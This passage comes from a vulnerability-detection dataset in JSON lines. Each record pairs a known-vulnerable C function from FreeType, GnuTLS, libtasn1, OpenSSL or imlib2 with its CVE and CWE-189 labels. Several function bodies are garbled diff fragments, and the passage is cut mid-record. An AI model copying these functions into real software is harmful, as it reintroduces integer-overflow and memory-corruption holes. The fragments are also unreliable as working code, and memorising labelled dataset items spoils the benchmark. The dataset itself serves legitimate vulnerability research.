it         */\n\n          FT_TRACE4(( \" closepath (invalid op)\\n\" ));\n\n          args = stack;\n          break;\n\n        case cff_op_hsbw:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" hsbw (invalid op)\\n\" ));\n\n          decoder->glyph_width = decoder->nominal_width + ( args[1] >> 16 );\n\n          decoder->builder.left_bearing.x = args[0];\n          decoder->builder.left_bearing.y = 0;\n\n          x    = decoder->builder.pos_x + args[0];\n          y    = decoder->builder.pos_y;\n          args = stack;\n          break;\n\n        case cff_op_sbw:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" sbw (invalid op)\\n\" ));\n\n          decoder->glyph_width = decoder->nominal_width + ( args[2] >> 16 );\n\n          decoder->builder.left_bearing.x = args[0];\n          decoder->builder.left_bearing.y = args[1];\n\n          x    = decoder->builder.pos_x + args[0];\n          y    = decoder->builder.pos_y + args[1];\n          args = stack;\n          break;\n\n        case cff_op_setcurrentpoint:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" setcurrentpoint (invalid op)\\n\" ));\n\n          x    = decoder->builder.pos_x + args[0];\n          y    = decoder->builder.pos_y + args[1];\n          args = stack;\n          break;\n\n        case cff_op_callothersubr:\n          /* this is an invalid Type 2 operator; however, there        */\n          /* exist fonts which are incorrectly converted from probably */\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" callothersubr (invalid op)\\n\" ));\n\n          /* subsequent `pop' operands should add the arguments,       */\n           /* this is the implementation described for `unknown' other  */\n           /* subroutines in the Type1 spec.                            */\n           args -= 2 + ( args[-2] >> 16 );\n           break;\n \n         case cff_op_pop:\n          /* Type 1 to CFF, and some parsers seem to accept it         */\n\n          FT_TRACE4(( \" pop (invalid op)\\n\" ));\n\n          args++;\n          break;\n\n        case cff_op_and:\n          {\n            FT_Fixed  cond = args[0] && args[1];\n\n\n            FT_TRACE4(( \" and\\n\" ));\n\n            args[0] = cond ? 0x10000L : 0;\n            args++;\n          }\n          break;\n\n        case cff_op_or:\n          {\n            FT_Fixed  cond = args[0] || args[1];\n\n\n            FT_TRACE4(( \" or\\n\" ));\n\n            args[0] = cond ? 0x10000L : 0;\n            args++;\n          }\n          break;\n\n        case cff_op_eq:\n          {\n            FT_Fixed  cond = !args[0];\n\n\n            FT_TRACE4(( \" eq\\n\" ));\n\n            args[0] = cond ? 0x10000L : 0;\n            args++;\n          }\n          break;\n\n        case cff_op_ifelse:\n          {\n            FT_Fixed  cond = ( args[2] <= args[3] );\n\n\n            FT_TRACE4(( \" ifelse\\n\" ));\n\n            if ( !cond )\n              args[0] = args[1];\n            args++;\n          }\n          break;\n\n        case cff_op_callsubr:\n          {\n            FT_UInt  idx = (FT_UInt)( ( args[0] >> 16 ) +\n                                      decoder->locals_bias );\n\n\n            FT_TRACE4(( \" callsubr(%d)\\n\", idx ));\n\n            if ( idx >= decoder->num_locals )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invalid local subr index\\n\" ));\n              goto Syntax_Error;\n            }\n\n            if ( zone - decoder->zones >= CFF_MAX_SUBRS_CALLS )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" too many nested subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            zone->cursor = ip;  /* save current instruction pointer */\n\n            zone++;\n            zone->base   = decoder->locals[idx];\n            zone->limit  = decoder->locals[idx + 1];\n            zone->cursor = zone->base;\n\n            if ( !zone->base || zone->limit == zone->base )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invoking empty subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            decoder->zone = zone;\n            ip            = zone->base;\n            limit         = zone->limit;\n          }\n          break;\n\n        case cff_op_callgsubr:\n          {\n            FT_UInt  idx = (FT_UInt)( ( args[0] >> 16 ) +\n                                      decoder->globals_bias );\n\n\n            FT_TRACE4(( \" callgsubr(%d)\\n\", idx ));\n\n            if ( idx >= decoder->num_globals )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invalid global subr index\\n\" ));\n              goto Syntax_Error;\n            }\n\n            if ( zone - decoder->zones >= CFF_MAX_SUBRS_CALLS )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" too many nested subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            zone->cursor = ip;  /* save current instruction pointer */\n\n            zone++;\n            zone->base   = decoder->globals[idx];\n            zone->limit  = decoder->globals[idx + 1];\n            zone->cursor = zone->base;\n\n            if ( !zone->base || zone->limit == zone->base )\n            {\n              FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                         \" invoking empty subrs\\n\" ));\n              goto Syntax_Error;\n            }\n\n            decoder->zone = zone;\n            ip            = zone->base;\n            limit         = zone->limit;\n          }\n          break;\n\n        case cff_op_return:\n          FT_TRACE4(( \" return\\n\" ));\n\n          if ( decoder->zone <= decoder->zones )\n          {\n            FT_ERROR(( \"cff_decoder_parse_charstrings:\"\n                       \" unexpected return\\n\" ));\n            goto Syntax_Error;\n          }\n\n          decoder->zone--;\n          zone  = decoder->zone;\n          ip    = zone->cursor;\n          limit = zone->limit;\n          break;\n\n        default:\n        Unimplemented:\n          FT_ERROR(( \"Unimplemented opcode: %d\", ip[-1] ));\n\n          if ( ip[-1] == 12 )\n            FT_ERROR(( \" %d\", ip[0] ));\n          FT_ERROR(( \"\\n\" ));\n\n          return CFF_Err_Unimplemented_Feature;\n        }\n\n      decoder->top = args;\n\n      } /* general operator processing */\n\n    } /* while ip < limit */\n\n    FT_TRACE4(( \"..end..\\n\\n\" ));\n\n  Fail:\n    return error;\n\n  Syntax_Error:\n    FT_TRACE4(( \"cff_decoder_parse_charstrings: syntax error\\n\" ));\n    return CFF_Err_Invalid_File_Format;\n\n  Stack_Underflow:\n    FT_TRACE4(( \"cff_decoder_parse_charstrings: stack underflow\\n\" ));\n    return CFF_Err_Too_Few_Arguments;\n\n  Stack_Overflow:\n    FT_TRACE4(( \"cff_decoder_parse_charstrings: stack overflow\\n\" ));\n    return CFF_Err_Stack_Overflow;\n  }\n", "func_hash": 78533740565488192289380822412773176149, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2010-2497", "cve_desc": "Integer underflow in glyph handling in FreeType before 2.4.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2497"}
{"idx": 344, "project": "savannah", "commit_id": "bc8102405fda11ea00ca3b42acc4f4bce9d6e97b", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls.git;a=commitdiff;h=bc8102405fda11ea00ca3b42acc4f4bce9d6e97b", "commit_message": "None", "target": 1, "func": "_gnutls_ciphertext2compressed (gnutls_session_t session,\n\t\t\t       opaque * compress_data,\n\t\t\t       int compress_size,\n\t\t\t       gnutls_datum_t ciphertext, uint8_t type)\n{\n  uint8_t MAC[MAX_HASH_SIZE];\n  uint16_t c_length;\n  uint8_t pad;\n  int length;\n  digest_hd_st td;\n  uint16_t blocksize;\n  int ret, i, pad_failed = 0;\n  uint8_t major, minor;\n  gnutls_protocol_t ver;\n  int hash_size =\n    _gnutls_hash_get_algo_len (session->security_parameters.\n\t\t\t       read_mac_algorithm);\n\n  ver = gnutls_protocol_get_version (session);\n  minor = _gnutls_version_get_minor (ver);\n  major = _gnutls_version_get_major (ver);\n\n  blocksize = _gnutls_cipher_get_block_size (session->security_parameters.\n\t\t\t\t\t     read_bulk_cipher_algorithm);\n\n  /* initialize MAC \n   */\n  ret = mac_init (&td, session->security_parameters.read_mac_algorithm,\n\t\t session->connection_state.read_mac_secret.data,\n\t\t session->connection_state.read_mac_secret.size, ver);\n\n  if (ret < 0\n      && session->security_parameters.read_mac_algorithm != GNUTLS_MAC_NULL)\n    {\n      gnutls_assert ();\n       return GNUTLS_E_INTERNAL_ERROR;\n     }\n \n \n   /* actual decryption (inplace)\n    */\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      length = ciphertext.size - hash_size;\n\n      break;\n    case CIPHER_BLOCK:\n      if ((ciphertext.size < blocksize) || (ciphertext.size % blocksize != 0))\n\t{\n\t  gnutls_assert ();\n\t  return GNUTLS_E_DECRYPTION_FAILED;\n\t}\n\n      if ((ret = _gnutls_cipher_decrypt (&session->connection_state.\n\t\t\t\t\t read_cipher_state,\n\t\t\t\t\t ciphertext.data,\n\t\t\t\t\t ciphertext.size)) < 0)\n\t{\n\t  gnutls_assert ();\n\t  return ret;\n\t}\n\n      /* ignore the IV in TLS 1.1.\n       */\n      if (session->security_parameters.version >= GNUTLS_TLS1_1)\n\t{\n\t  ciphertext.size -= blocksize;\n\t  ciphertext.data += blocksize;\n\n\t  if (ciphertext.size == 0)\n\t    {\n\t      gnutls_assert ();\n\t      return GNUTLS_E_DECRYPTION_FAILED;\n\t    }\n\t}\n\n      pad = ciphertext.data[ciphertext.size - 1] + 1;\t/* pad */\n\n      length = ciphertext.size - hash_size - pad;\n\n      if (pad > ciphertext.size - hash_size)\n\t{\n\t  gnutls_assert ();\n \n       pad = ciphertext.data[ciphertext.size - 1] + 1;  /* pad */\n \n      length = ciphertext.size - hash_size - pad;\n      if (pad > ciphertext.size - hash_size)\n        {\n          gnutls_assert ();\n          /* We do not fail here. We check below for the\n       */\n      if (ver >= GNUTLS_TLS1 && pad_failed == 0)\n          pad_failed = GNUTLS_E_DECRYPTION_FAILED;\n        }\n \n       /* Check the pading bytes (TLS 1.x)\n        */\n       if (ver >= GNUTLS_TLS1 && pad_failed == 0)\n      gnutls_assert ();\n      return GNUTLS_E_INTERNAL_ERROR;\n    }\n\n  if (length < 0)\n    length = 0;\n  c_length = _gnutls_conv_uint16 ((uint16_t) length);\n\n  /* Pass the type, version, length and compressed through\n   * MAC.\n   */\n  if (session->security_parameters.read_mac_algorithm != GNUTLS_MAC_NULL)\n    {\n      _gnutls_hmac (&td,\n\t\t    UINT64DATA (session->connection_state.\n\t\t\t\tread_sequence_number), 8);\n\n      _gnutls_hmac (&td, &type, 1);\n      if (ver >= GNUTLS_TLS1)\n\t{\t\t\t/* TLS 1.x */\n\t  _gnutls_hmac (&td, &major, 1);\n\t  _gnutls_hmac (&td, &minor, 1);\n\t}\n      _gnutls_hmac (&td, &c_length, 2);\n\n      if (length > 0)\n\t_gnutls_hmac (&td, ciphertext.data, length);\n\n      mac_deinit (&td, MAC, ver);\n    }\n\n  /* This one was introduced to avoid a timing attack against the TLS\n   * 1.0 protocol.\n   */\n  if (pad_failed != 0)\n    return pad_failed;\n\n  /* HMAC was not the same. \n   */\n  if (memcmp (MAC, &ciphertext.data[length], hash_size) != 0)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_DECRYPTION_FAILED;\n    }\n\n  /* copy the decrypted stuff to compress_data.\n   */\n  if (compress_size < length)\n    {\n      gnutls_assert ();\n      return GNUTLS_E_DECOMPRESSION_FAILED;\n    }\n  memcpy (compress_data, ciphertext.data, length);\n\n  return length;\n}\n", "func_hash": 240557542046470369478162712950471631896, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2008-1950", "cve_desc": "Integer signedness error in the _gnutls_ciphertext2compressed function in lib/gnutls_cipher.c in libgnutls in GnuTLS before 2.2.4 allows remote attackers to cause a denial of service (buffer over-read and crash) via a certain integer value in the Random field in an encrypted Client Hello message within a TLS record with an invalid Record Length, which leads to an invalid cipher padding length, aka GNUTLS-SA-2008-1-3.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2008-1950"}
{"idx": 364, "project": "savannah", "commit_id": "1c3ccb3e040bf13e342ee60bc23b21b97b11923f", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/libtasn1.git/commit/?id=1c3ccb3e040bf13e342ee60bc23b21b97b11923f", "commit_message": "None", "target": 1, "func": "asn1_get_bit_der (const unsigned char *der, int der_len,\n \t\t  int *ret_len, unsigned char *str, int str_size,\n \t\t  int *bit_len)\n {\n  int len_len, len_byte;\n \n   if (der_len <= 0)\n     return ASN1_GENERIC_ERROR;\n  len_byte = asn1_get_length_der (der, der_len, &len_len) - 1;\n  if (len_byte < 0)\n    return ASN1_DER_ERROR;\n \n   *ret_len = len_byte + len_len + 1;\n   *bit_len = len_byte * 8 - der[len_len];\n \n   if (str_size >= len_byte)\n     memcpy (str, der + len_len + 1, len_byte);\n    }\n", "func_hash": 41675434541008202288249540494015225926, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-3468", "cve_desc": "The asn1_get_bit_der function in GNU Libtasn1 before 3.6 does not properly report an error when a negative bit length is identified, which allows context-dependent attackers to cause out-of-bounds access via crafted ASN.1 data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-3468"}
{"idx": 371, "project": "openssl", "commit_id": "1fb9fdc3027b27d8eb6a1e6a846435b070980770", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commit;h=1fb9fdc3027b27d8eb6a1e6a846435b070980770", "commit_message": "Fix DTLS replay protection\n\nThe DTLS implementation provides some protection against replay attacks\nin accordance with RFC6347 section 4.1.2.6.\n\nA sliding \"window\" of valid record sequence numbers is maintained with\nthe \"right\" hand edge of the window set to the highest sequence number we\nhave received so far. Records that arrive that are off the \"left\" hand\nedge of the window are rejected. Records within the window are checked\nagainst a list of records received so far. If we already received it then\nwe also reject the new record.\n\nIf we have not already received the record, or the sequence number is off\nthe right hand edge of the window then we verify the MAC of the record.\nIf MAC verification fails then we discard the record. Otherwise we mark\nthe record as received. If the sequence number was off the right hand edge\nof the window, then we slide the window along so that the right hand edge\nis in line with the newly received sequence number.\n\nRecords may arrive for future epochs, i.e. a record from after a CCS being\nsent, can arrive before the CCS does if the packets get re-ordered. As we\nhave not yet received the CCS we are not yet in a position to decrypt or\nvalidate the MAC of those records. OpenSSL places those records on an\nunprocessed records queue. It additionally updates the window immediately,\neven though we have not yet verified the MAC. This will only occur if\ncurrently in a handshake/renegotiation.\n\nThis could be exploited by an attacker by sending a record for the next\nepoch (which does not have to decrypt or have a valid MAC), with a very\nlarge sequence number. This means the right hand edge of the window is\nmoved very far to the right, and all subsequent legitimate packets are\ndropped causing a denial of service.\n\nA similar effect can be achieved during the initial handshake. In this\ncase there is no MAC key negotiated yet. Therefore an attacker can send a\nmessage for the current epoch with a very large sequence number. The code\nwill process the record as normal. If the hanshake message sequence number\n(as opposed to the record sequence number that we have been talking about\nso far) is in the future then the injected message is bufferred to be\nhandled later, but the window is still updated. Therefore all subsequent\nlegitimate handshake records are dropped. This aspect is not considered a\nsecurity issue because there are many ways for an attacker to disrupt the\ninitial handshake and prevent it from completing successfully (e.g.\ninjection of a handshake message will cause the Finished MAC to fail and\nthe handshake to be aborted). This issue comes about as a result of trying\nto do replay protection, but having no integrity mechanism in place yet.\nDoes it even make sense to have replay protection in epoch 0? That\nissue isn't addressed here though.\n\nThis addressed an OCAP Audit issue.\n\nCVE-2016-2181\n\nReviewed-by: Richard Levitte <levitte@openssl.org>", "target": 1, "func": "int dtls1_process_buffered_records(SSL *s)\n {\n     pitem *item;\n     SSL3_BUFFER *rb;\n \n     item = pqueue_peek(s->rlayer.d->unprocessed_rcds.q);\n     if (item) {\n         /* Check if epoch is current. */\n         if (s->rlayer.d->unprocessed_rcds.epoch != s->rlayer.d->r_epoch)\n            return (1);         /* Nothing to do. */\n \n         rb = RECORD_LAYER_get_rbuf(&s->rlayer);\n \n             */\n            return 1;\n        }\n\n        /* Process all the records. */\n        while (pqueue_peek(s->rlayer.d->unprocessed_rcds.q)) {\n            dtls1_get_unprocessed_record(s);\n            if (!dtls1_process_record(s))\n                return (0);\n            if (dtls1_buffer_record(s, &(s->rlayer.d->processed_rcds),\n         /* Process all the records. */\n         while (pqueue_peek(s->rlayer.d->unprocessed_rcds.q)) {\n             dtls1_get_unprocessed_record(s);\n            if (!dtls1_process_record(s))\n                return (0);\n             if (dtls1_buffer_record(s, &(s->rlayer.d->processed_rcds),\n                                    SSL3_RECORD_get_seq_num(s->rlayer.rrec)) <\n                0)\n                return -1;\n         }\n     }\n \n *             here, anything else is handled by higher layers\n *     Application data protocol\n *             none of our business\n */\n     s->rlayer.d->processed_rcds.epoch = s->rlayer.d->r_epoch;\n     s->rlayer.d->unprocessed_rcds.epoch = s->rlayer.d->r_epoch + 1;\n \n    return (1);\n }\n", "func_hash": 299136167801831334632170022306068067325, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2181", "cve_desc": "The Anti-Replay feature in the DTLS implementation in OpenSSL before 1.1.0 mishandles early use of a new epoch number in conjunction with a large sequence number, which allows remote attackers to cause a denial of service (false-positive packet drops) via spoofed DTLS records, related to rec_layer_d1.c and ssl3_record.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2181"}
{"idx": 390, "project": "openssl", "commit_id": "3f3582139fbb259a1c3cbb0a25236500a409bf26", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commitdiff;h=3f3582139fbb259a1c3cbb0a25236500a409bf26", "commit_message": "Fix encrypt overflow\n\nAn overflow can occur in the EVP_EncryptUpdate function. If an attacker is\nable to supply very large amounts of input data after a previous call to\nEVP_EncryptUpdate with a partial block then a length check can overflow\nresulting in a heap corruption.\n\nFollowing an analysis of all OpenSSL internal usage of the\nEVP_EncryptUpdate function all usage is one of two forms.\n\nThe first form is like this:\nEVP_EncryptInit()\nEVP_EncryptUpdate()\n\ni.e. where the EVP_EncryptUpdate() call is known to be the first called\nfunction after an EVP_EncryptInit(), and therefore that specific call\nmust be safe.\n\nThe second form is where the length passed to EVP_EncryptUpdate() can be\nseen from the code to be some small value and therefore there is no\npossibility of an overflow.\n\nSince all instances are one of these two forms, I believe that there can\nbe no overflows in internal code due to this problem.\n\nIt should be noted that EVP_DecryptUpdate() can call EVP_EncryptUpdate()\nin certain code paths. Also EVP_CipherUpdate() is a synonym for\nEVP_EncryptUpdate(). Therefore I have checked all instances of these\ncalls too, and came to the same conclusion, i.e. there are no instances\nin internal usage where an overflow could occur.\n\nThis could still represent a security issue for end user code that calls\nthis function directly.\n\nCVE-2016-2106\n\nIssue reported by Guido Vranken.\n\nReviewed-by: Tim Hudson <tjh@openssl.org>", "target": 1, "func": "int EVP_EncryptUpdate(EVP_CIPHER_CTX *ctx, unsigned char *out, int *outl,\n                      const unsigned char *in, int inl)\n{\n    int i, j, bl;\n\n    if (ctx->cipher->flags & EVP_CIPH_FLAG_CUSTOM_CIPHER) {\n        i = ctx->cipher->do_cipher(ctx, out, in, inl);\n        if (i < 0)\n            return 0;\n        else\n            *outl = i;\n        return 1;\n    }\n\n    if (inl <= 0) {\n        *outl = 0;\n        return inl == 0;\n    }\n\n    if (ctx->buf_len == 0 && (inl & (ctx->block_mask)) == 0) {\n        if (ctx->cipher->do_cipher(ctx, out, in, inl)) {\n            *outl = inl;\n            return 1;\n        } else {\n            *outl = 0;\n            return 0;\n        }\n    }\n    i = ctx->buf_len;\n     bl = ctx->cipher->block_size;\n     OPENSSL_assert(bl <= (int)sizeof(ctx->buf));\n     if (i != 0) {\n        if (i + inl < bl) {\n             memcpy(&(ctx->buf[i]), in, inl);\n             ctx->buf_len += inl;\n             *outl = 0;\n            return 1;\n        } else {\n            j = bl - i;\n            memcpy(&(ctx->buf[i]), in, j);\n            if (!ctx->cipher->do_cipher(ctx, out, ctx->buf, bl))\n                return 0;\n            inl -= j;\n            in += j;\n            out += bl;\n            *outl = bl;\n        }\n    } else\n        *outl = 0;\n    i = inl & (bl - 1);\n    inl -= i;\n    if (inl > 0) {\n        if (!ctx->cipher->do_cipher(ctx, out, in, inl))\n            return 0;\n        *outl += inl;\n    }\n\n    if (i != 0)\n        memcpy(ctx->buf, &(in[inl]), i);\n    ctx->buf_len = i;\n    return 1;\n}\n", "func_hash": 136934056290217214609523870578341166755, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2106", "cve_desc": "Integer overflow in the EVP_EncryptUpdate function in crypto/evp/evp_enc.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory corruption) via a large amount of data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2106"}
{"idx": 391, "project": "openssl", "commit_id": "5b814481f3573fa9677f3a31ee51322e2a22ee6a", "project_url": "https://github.com/openssl/openssl", "commit_url": "https://git.openssl.org/?p=openssl.git;a=commitdiff;h=5b814481f3573fa9677f3a31ee51322e2a22ee6a", "commit_message": "Avoid overflow in EVP_EncodeUpdate\n\nAn overflow can occur in the EVP_EncodeUpdate function which is used for\nBase64 encoding of binary data. If an attacker is able to supply very large\namounts of input data then a length check can overflow resulting in a heap\ncorruption. Due to the very large amounts of data involved this will most\nlikely result in a crash.\n\nInternally to OpenSSL the EVP_EncodeUpdate function is primarly used by the\nPEM_write_bio* family of functions. These are mainly used within the\nOpenSSL command line applications, so any application which processes\ndata from an untrusted source and outputs it as a PEM file should be\nconsidered vulnerable to this issue.\n\nUser applications that call these APIs directly with large amounts of\nuntrusted data may also be vulnerable.\n\nIssue reported by Guido Vranken.\n\nCVE-2016-2105\n\nReviewed-by: Richard Levitte <levitte@openssl.org>", "target": 1, "func": "void EVP_EncodeUpdate(EVP_ENCODE_CTX *ctx, unsigned char *out, int *outl,\n                      const unsigned char *in, int inl)\n{\n    int i, j;\n    unsigned int total = 0;\n\n    *outl = 0;\n     if (inl <= 0)\n         return;\n     OPENSSL_assert(ctx->length <= (int)sizeof(ctx->enc_data));\n    if ((ctx->num + inl) < ctx->length) {\n         memcpy(&(ctx->enc_data[ctx->num]), in, inl);\n         ctx->num += inl;\n         return;\n    }\n    if (ctx->num != 0) {\n        i = ctx->length - ctx->num;\n        memcpy(&(ctx->enc_data[ctx->num]), in, i);\n        in += i;\n        inl -= i;\n        j = EVP_EncodeBlock(out, ctx->enc_data, ctx->length);\n        ctx->num = 0;\n        out += j;\n        *(out++) = '\\n';\n        *out = '\\0';\n        total = j + 1;\n    }\n    while (inl >= ctx->length) {\n        j = EVP_EncodeBlock(out, in, ctx->length);\n        in += ctx->length;\n        inl -= ctx->length;\n        out += j;\n        *(out++) = '\\n';\n        *out = '\\0';\n        total += j + 1;\n    }\n    if (inl != 0)\n        memcpy(&(ctx->enc_data[0]), in, inl);\n    ctx->num = inl;\n    *outl = total;\n}\n", "func_hash": 270135404994675151022539958893968212454, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2105", "cve_desc": "Integer overflow in the EVP_EncodeUpdate function in crypto/evp/encode.c in OpenSSL before 1.0.1t and 1.0.2 before 1.0.2h allows remote attackers to cause a denial of service (heap memory corruption) via a large amount of binary data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2105"}
{"idx": 451, "project": "enlightment", "commit_id": "c21beaf1780cf3ca291735ae7d58a3dde63277a2", "project_url": "https://git.enlightenment.org/legacy/imlib2", "commit_url": "https://git.enlightenment.org/legacy/imlib2.git/commit/?h=v1.4.7&id=c21beaf1780cf3ca291735ae7d58a3dde63277a2", "commit_message": "None", "target": 1, "func": "load(ImlibImage * im, ImlibProgressFunction progress,\n     char progress_granularity, char immediate_load)\n{\n   int                 rc;\n   char                p = ' ', numbers = 3, count = 0;\n   int                 w = 0, h = 0, v = 255, c = 0;\n   char                buf[256];\n   FILE               *f = NULL;\n\n   if (im->data)\n      return 0;\n   f = fopen(im->real_file, \"rb\");\n   if (!f)\n      return 0;\n\n   /* can't use fgets(), because there might be\n    * binary data after the header and there\n    * needn't be a newline before the data, so\n    * no chance to distinguish between end of buffer\n    * and a binary 0.\n    */\n\n   /* read the header info */\n\n   rc = 0;                      /* Error */\n\n   c = fgetc(f);\n   if (c != 'P')\n      goto quit;\n\n   p = fgetc(f);\n   if (p == '1' || p == '4')\n      numbers = 2;              /* bitimages don't have max value */\n\n   if ((p < '1') || (p > '8'))\n      goto quit;\n\n   count = 0;\n   while (count < numbers)\n     {\n        c = fgetc(f);\n\n        if (c == EOF)\n           goto quit;\n\n        /* eat whitespace */\n        while (isspace(c))\n           c = fgetc(f);\n        /* if comment, eat that */\n        if (c == '#')\n          {\n             do\n                c = fgetc(f);\n             while (c != '\\n' && c != EOF);\n          }\n        /* no comment -> proceed */\n        else\n          {\n             int                 i = 0;\n\n             /* read numbers */\n             while (c != EOF && !isspace(c) && (i < 255))\n               {\n                  buf[i++] = c;\n                  c = fgetc(f);\n               }\n             if (i)\n               {\n                  buf[i] = 0;\n                  count++;\n                  switch (count)\n                    {\n                       /* width */\n                    case 1:\n                       w = atoi(buf);\n                       break;\n                       /* height */\n                    case 2:\n                       h = atoi(buf);\n                       break;\n                       /* max value, only for color and greyscale */\n                    case 3:\n                       v = atoi(buf);\n                       break;\n                    }\n               }\n          }\n     }\n   if ((v < 0) || (v > 255))\n      goto quit;\n\n   im->w = w;\n   im->h = h;\n   if (!IMAGE_DIMENSIONS_OK(w, h))\n      goto quit;\n\n   if (!im->format)\n     {\n        if (p == '8')\n           SET_FLAG(im->flags, F_HAS_ALPHA);\n        else\n           UNSET_FLAG(im->flags, F_HAS_ALPHA);\n        im->format = strdup(\"pnm\");\n     }\n\n   rc = 1;                      /* Ok */\n\n   if (((!im->data) && (im->loader)) || (immediate_load) || (progress))\n     {\n        DATA8              *data = NULL;        /* for the binary versions */\n        DATA8              *ptr = NULL;\n        int                *idata = NULL;       /* for the ASCII versions */\n        int                *iptr;\n        char                buf2[256];\n        DATA32             *ptr2;\n        int                 i, j, x, y, pl = 0;\n        char                pper = 0;\n\n        /* must set the im->data member before callign progress function */\n        ptr2 = im->data = malloc(w * h * sizeof(DATA32));\n        if (!im->data)\n           goto quit_error;\n\n        /* start reading the data */\n        switch (p)\n          {\n          case '1':            /* ASCII monochrome */\n             buf[0] = 0;\n             i = 0;\n             for (y = 0; y < h; y++)\n               {\n                  x = 0;\n                  while (x < w)\n                    {\n                       if (!buf[i])     /* fill buffer */\n                         {\n                            if (!fgets(buf, 255, f))\n                               goto quit_error;\n                            i = 0;\n                         }\n                       while (buf[i] && isspace(buf[i]))\n                          i++;\n                       if (buf[i])\n                         {\n                            if (buf[i] == '1')\n                               *ptr2 = 0xff000000;\n                            else if (buf[i] == '0')\n                               *ptr2 = 0xffffffff;\n                            else\n                               goto quit_error;\n                            ptr2++;\n                            i++;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '2':            /* ASCII greyscale */\n             idata = malloc(sizeof(int) * w);\n             if (!idata)\n                goto quit_error;\n\n             buf[0] = 0;\n             i = 0;\n             j = 0;\n             for (y = 0; y < h; y++)\n               {\n                  iptr = idata;\n                  x = 0;\n                  while (x < w)\n                    {\n                       int                 k;\n\n                       /* check 4 chars ahead to see if we need to\n                        * fill the buffer */\n                       for (k = 0; k < 4; k++)\n                         {\n                            if (!buf[i + k])    /* fill buffer */\n                              {\n                                 if (fseek(f, -k, SEEK_CUR) == -1 ||\n                                     !fgets(buf, 255, f))\n                                    goto quit_error;\n                                 i = 0;\n                                 break;\n                              }\n                         }\n                       while (buf[i] && isspace(buf[i]))\n                          i++;\n                       while (buf[i] && !isspace(buf[i]))\n                          buf2[j++] = buf[i++];\n                       if (j)\n                         {\n                            buf2[j] = 0;\n                            *(iptr++) = atoi(buf2);\n                            j = 0;\n                            x++;\n                          }\n                     }\n                   iptr = idata;\n                  if (v == 255)\n                     {\n                        for (x = 0; x < w; x++)\n                          {\n                            *ptr2 =\n                               0xff000000 | (iptr[0] << 16) | (iptr[0] << 8)\n                               | iptr[0];\n                            ptr2++;\n                            iptr++;\n                         }\n                    }\n                  else\n                    {\n                       for (x = 0; x < w; x++)\n                         {\n                            *ptr2 =\n                               0xff000000 |\n                               (((iptr[0] * 255) / v) << 16) |\n                               (((iptr[0] * 255) / v) << 8) |\n                               ((iptr[0] * 255) / v);\n                            ptr2++;\n                            iptr++;\n                         }\n                    }\n                  if (progress &&\n                      do_progress(im, progress, progress_granularity,\n                                  &pper, &pl, y))\n                     goto quit_progress;\n               }\n             break;\n          case '3':            /* ASCII RGB */\n             idata = malloc(3 * sizeof(int) * w);\n             if (!idata)\n                goto quit_error;\n\n             buf[0] = 0;\n             i = 0;\n             j = 0;\n             for (y = 0; y < h; y++)\n               {\n                  int                 w3 = 3 * w;\n\n                  iptr = idata;\n                  x = 0;\n                  while (x < w3)\n                    {\n                       int                 k;\n\n                       /* check 4 chars ahead to see if we need to\n                        * fill the buffer */\n                       for (k = 0; k < 4; k++)\n                         {\n                            if (!buf[i + k])    /* fill buffer */\n                              {\n                                 if (fseek(f, -k, SEEK_CUR) == -1 ||\n                                     !fgets(buf, 255, f))\n                                    goto quit_error;\n                                 i = 0;\n                                 break;\n                              }\n                         }\n                       while (buf[i] && isspace(buf[i]))\n                          i++;\n                       while (buf[i] && !isspace(buf[i]))\n                          buf2[j++] = buf[i++];\n                       if (j)\n                         {\n                            buf2[j] = 0;\n                            *(iptr++) = atoi(buf2);\n                            j = 0;\n                            x++;\n                          }\n                     }\n                   iptr = 